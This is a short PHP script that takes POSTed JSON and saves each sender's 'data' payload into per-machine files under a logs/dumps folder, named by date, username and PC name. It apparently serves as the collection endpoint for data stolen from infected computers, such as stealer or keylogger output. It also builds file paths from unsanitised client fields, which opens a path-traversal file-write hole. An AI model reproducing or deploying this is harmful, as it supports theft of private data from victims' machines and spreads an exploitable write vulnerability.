<?php


if($_SERVER['REQUEST_METHOD'] == "POST"){

    $data = file_get_contents('php://input');
    $date = date('dMYH');


    $jsonArray = json_decode($data,TRUE);

    $FileName = $date."-".$jsonArray['username']."@".$jsonArray['pcname'].".json";

    $khode_data = $jsonArray['data'];

    $path = "../logs/dumps/";

    if(!file_exists($path.$FileName)){
        $fw = fopen($path.$FileName,"a");
        fwrite($fw,json_encode($khode_data));
        fclose($fw);
        file_put_contents("file-names.json",json_encode(array("name"=>$path.$FileName)));
 


    }
    else{

        $json = file_get_contents($path.$FileName);
        $dec_json = json_decode($json);
        $dec_json[] = $khode_data;
        file_put_contents($path.$FileName, json_encode($dec_json));

        echo 'ok';
    };
}


?>